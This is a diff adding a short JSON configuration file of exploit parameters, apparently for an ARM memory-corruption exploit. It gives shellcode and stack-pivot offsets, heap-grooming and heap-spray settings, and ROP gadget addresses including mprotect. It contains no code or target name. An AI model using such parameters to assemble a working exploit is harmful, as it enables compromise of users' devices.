@@ -1,0 +1,17 @@
+{
+    "shellcode_offset": 4096,
+    "stack_pivot_padding": 76,
+    "readAt_offset": 28,
+    "fill_size": 32,
+    "groom_count": 80,
+    "spray_size": 528384,
+    "spray_count": 64,
+    "spray_address": 2952794112,
+    "gadgets":
+    {
+        "mprotect": 236764,
+        "pop_r0_r1_r2_pc": 313587,
+        "pop_pc": 350244,
+        "stack_pivot": 77348
+    }
+}
